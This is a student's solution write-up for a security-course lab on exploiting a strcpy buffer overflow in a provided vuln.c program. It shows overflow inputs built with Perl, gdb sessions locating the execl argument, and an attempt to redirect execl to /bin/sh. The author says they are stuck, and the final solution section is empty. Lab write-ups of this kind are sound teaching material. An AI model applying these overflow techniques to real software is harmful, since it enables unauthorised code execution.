# Solutions TP6

## 6.2 Evading Stack Protection
> In "vuln.c" is a program that has a vulnerability even when compiled with stack protection. This file can be built with: `gcc -z execstack -o vuln vuln.c`, optionally you can also include debugging information with "-g".
> 
> NOTE: we do compile with stack protection! The goal of this part of the tutorial is for you to exploit code with stack protection enabled!
> 
> We can run this program with: `./vuln AAAA BBBB` and see that we are shown some memory addresses (these are included to help you).
> 
> By examining the code we can see that there is an instance of strcpy that we can probably exploit.
> 
> The goal is to provide command line arguments that allow you to execute a shellcode (of your choice, but a simple /bin/sh one is fine including taking one from an earlier tutorial).
> 
> HINT: Use the first strcpy to overflow and change the value of where "p" points to.

### Idea :bulb:
We can see that in function *f*, an unsfae call to *strcpy* is made, copying the whole string passed in `argv[1]` in a char array of size 30.  This is a good entry point for a buffer overflow.  
We can also see that we have a pointer, `p` (initially set equal to the pointer of the array), that we use as destination for our *strcpy*.  We can then overwrite the value of this pointer with the first argument (and first call to *strcpy*) by doing an overflow on the array, and then write our interesting command wherever we want with the second argument (and second call to *strncpy*).

### Step by step :walking:
**1. Overwriting p** This is quite simple, we have done it plenty of time before, we can simply run the program with a string of more than 30 caracters.
```console
$ ./vuln `perl -e 'print "\x90"x30 . "\x42"x4'` BBBB
p=bffff2fe       -- before 1st strcpy
p=42424242       -- after 1st  strcpy
Segmentation fault
```
Of course we get a *Segmentation fault* as we try to write to the address `0x42424242` with our second *strncpy*, which is probably not a writable one.

**2. Execl arguments**  The final goal will be to change the argument passed to *execl*, to give it a command that would open a shell (`/bin/sh`).  To do this, we need to know where is this argument stored in memory.  
> From here I am not very sure of what I'm doing, there might be better way of proceeding.  

First we need to know what we are looking for, in memory the initial first argument won't be presented in convenient ascii characters but in heaxadecimal values, so let's check what those values would be (you can use any online coverter for this):
```
back_to_vul --> 62 61 63 6b 5f 74 6f 5f 76 75 6c 0d 0a
```
In gdb, we can run the file one time to fix the addresses, then disass the main function.
```console
$ (gdb) run aaa bbb
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln aaa bbb
...
$ (gdb) disass main
Dump of assembler code for function main:
   ...
   0x00401290 <+45>:    push   $0x0
   0x00401292 <+47>:    lea    -0x1fa9(%ebx),%eax
   0x00401298 <+53>:    push   %eax
   0x00401299 <+54>:    lea    -0x1fa8(%ebx),%eax
   0x0040129f <+60>:    push   %eax
   0x004012a0 <+61>:    call   0x401080 <execl@plt>
   ...    
End of assembler dump.
```
We can see here the three arguments of *execl* being pushed to the stack before the call of the function, the last one being the first argument of the function (the one we have interest in).  To see what is the value pushed on the stack, we can add a breakpoint just after this last push, and see what is the value of `eax` at this moment.  By printing the content of the memory at this address, we should then find the string *back_to_vul" (in hexadecimal of course).
```console
$ (gdb) b *0x40129f
Breakpoint 1 at 0x40129f: file vuln.c, line 23.
$ (gdb) run aaa bbb
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln aaa bbb
...
Breakpoint 1, 0x0040129f in main ()
$ (gdb) i r $eax
eax            0x402058            4202584
$ (gdb) x/4xw 0x402058
0x402058:       0x6b636162      0x5f6f745f      0x006c7576      0x20646e45
```
We found the address (`0x00402058`) of the string to overwrite!

**3. Overwriting execl argument**
This is where I'm stuck, of of the caracters that we would need to pass in argument of the function is `\x20`, which correspond to the space character...  In theory we would need to simply do this:
```console
$ (gdb) run `perl -e 'print "\x90"x30 . "\x58\x20\x40"'` /bin/sh
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln `perl -e 'print "\x90"x30 . "\x58\x20\x40"'` /bin/sh
p=bffff28e       -- before 1st strcpy
p=bfff0058       -- after 1st  strcpy
```
But we can see that the first argument passed to the function will be cut after the space character...

### Final solution :running:
